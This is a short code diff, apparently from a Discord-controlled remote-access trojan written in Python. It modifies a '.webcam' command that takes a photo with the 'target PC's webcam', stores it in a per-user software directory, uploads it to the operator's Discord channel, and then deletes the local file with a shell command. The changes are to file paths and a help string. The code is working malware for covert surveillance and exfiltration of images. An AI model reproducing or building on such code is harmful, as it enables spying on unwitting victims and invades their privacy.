@@ -29,17 +29,16 @@ elif message.content[:7] == '.webcam':
 
             camera.stop()
 
-            pygame.image.save(image, 'webcam.png')
+            pygame.image.save(image, f'C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png')
 
             reaction_msg = await message.channel.send(
                 embed=discord.Embed(title=current_time(True) + ' `[On demand]`')
                 .set_image(url='attachment://webcam.png'),
-                file=discord.File('webcam.png'))
+                file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png'))
             await reaction_msg.add_reaction('📌')
 
             subprocess.run('del webcam.png', shell=True)
 
         else:
-            reaction_msg = await message.channel.send(
-                '```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```')
+            reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```')
             await reaction_msg.add_reaction('🔴')
